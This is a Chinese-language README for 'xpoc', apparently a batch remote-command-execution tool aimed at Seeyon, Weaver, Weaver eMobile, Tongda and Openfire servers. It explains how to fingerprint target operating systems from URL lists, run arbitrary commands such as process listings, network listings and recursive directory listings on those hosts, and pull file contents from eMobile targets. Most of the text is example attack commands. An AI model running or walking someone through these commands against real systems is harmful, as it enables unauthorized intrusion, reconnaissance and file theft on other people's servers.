# 使用说明

## 安装依赖环境

centos:

```shell
wget https://download.oracle.com/java/20/archive/jdk-20.0.1_linux-x64_bin.rpm
rpm -i jdk-20.0.1_linux-x64_bin.rpm
```

ubuntu:
```shell
wget https://download.oracle.com/java/20/archive/jdk-20.0.1_linux-x64_bin.deb
dpkg -i jdk-20.0.1_linux-x64_bin.deb
```

## 参数说明

-u  目标URL

-f  一个存储目标URL列表的文件，每行一个目标URL

-b  获取目标系统的基本信息，这个命令应该第一个被执行

-c  执行的cmd命令

-s  目标系统的shell名，可选的有cmd、sh。（目标系统是windows的情况下使用cmd，Linux则使用sh，一般情况下使用默认）

--cache  是否跳过缓存目标，开启后，已经成功的设备不会再被二次打击

-m  可选择的模块:

   - seeyon（致远）
   - weaver（泛微）
   - openfire
   - weaveremobile（泛微的emobile）
   - tongda（通达）

## 使用方式

1. 首先，判断目标设备的操作系统类型

   例如：`./xpoc -f targets.txt -m <model> -b`，判断目标操作系统的类型

   这一步会生成目标操作系统基本信息文件：basic_xxxx.txt

   targets.txt文件的内容为URL，形如：

   ```
   http://127.0.0.1:8890
   https://127.0.0.1:9091
   ...
   ```

2. 探明操作系统后，则执行对应操作系统上的命令，可以使用命令配置文件：

   例如，执行多条命令的配置文件config.json：

   ```json
   {
       "windows": ["tasklist", "netstat -ano"],
       "linux": ["ps -efw", "netstat -anpt"]
   }
   ```

   执行单条命令的配置文件config.json：

   ```json
   {
       "windows": "tasklist",
       "linux": "ps -efw"
   }
   ```

   像这样使用命令配置文件：`./xpoc -f basic_xxxx.txt -m <model> -c f:config.json`，使用前面生成的basic_xxxx.txt作为-f的参数，同时-c的参数需要使用f:指定配置文件的路径。

3. 当然，也可以不使用配置文件

   `./xpoc -f targets.txt -m <model> -c "ps -efw"`

   `./xpoc -f targets.txt -m <model> -c "dir \"c:\\Program Files\" "`

   **注意：如果不使用配置文件，则不需要使用basic_xxxx.txt作为-f的参数；同时注意命令中的`"`和`\`等需要转义。**

**注意事项**

1. 如果命令执行的时间过长，如取整个磁盘的文件列表，会导致程序超时无法正确执行，不建议使用
3. 命令执行的结果保存在output目录中，以目标IP为文件名，多次取证会覆盖同名文件，注意备份保存

## 特别说明

1. 当前，泛微(weaver)和致远（seeyon）这两个模块可以使用 -s 参数来修改执行命令的shell，如：

   `./xpoc -m seeyon -u http://192.168.100.250 -s sh -c ls  # 目标系统是linux的情况下，可使用-s参数来修改默认的shell`

2. weaveremobile模块支持取文件内容

   `./xpoc -m weaveremobile -u http://192.168.100.250 -d "c:/program files/abc/123"`

   注意事项：

   - 不会取目录中的子目录，只会取当前目录下的文件
   - 不要试图取那种目录下有超大、超多的文件的目录，可能会导致程序超时
   - 该功能暂时只支持weaveremobile

3. openfire的目标系统有windows和linux两种，其中的系统文件有很多，在取文件列表时如果直接进行全磁盘取可能会超时出错，这里建议这样操作：

   ```shell
   # 首先，判断操作系统类型
   ./xpoc -m openfire -f targets.txt -b    # 执行完后会生成basic_xxxxx.txt
   # 从basic_xxxxxx.txt中提取出windows和linux对应的URL
   
   # 对于目标是windows的：
   # 注意，windows上需要对特殊符号\和”进行转义: \\和\"
   ./xpoc -m openfire -f win.txt -c "cmd /c dir c:\\" 		# 首先列出C盘下的文件列表（其他盘符类似）
   ./xpoc -m openfire -f win.txt -c "cmd /c dir <路径>"	   # 注意路径中的特殊符号需要转义
   ./xpoc -m openfire -f win.txt -c "cmd /c dir /s <路径>"	   # 注意路径中的特殊符号需要转义，递归列举
   
   # 对于目标是Linux的：
   ./xpoc -m openfire -f linux.txt -c "ls -laR /usr/bin /usr/sbin /tmp /var /opt"  # 通过指定目录缩小范围
   ```

   如果结果文件中有`<br>`，这是HTML的换行，可以使用`notepad++`的文件替换功能将其替换为`\r\n`，便于阅读
